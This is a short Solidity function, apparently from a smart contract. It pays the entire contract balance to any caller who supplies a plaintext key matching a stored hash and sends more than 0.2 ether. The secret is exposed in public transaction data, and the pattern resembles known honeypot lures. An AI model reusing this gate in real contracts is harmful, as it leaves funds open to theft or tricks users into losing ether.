function withdraw(string key) public payable {
    require(msg.sender == tx.origin);
    if (keyHash == keccak256(abi.encodePacked(key))) {
        if (msg.value > 0.2 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }
}
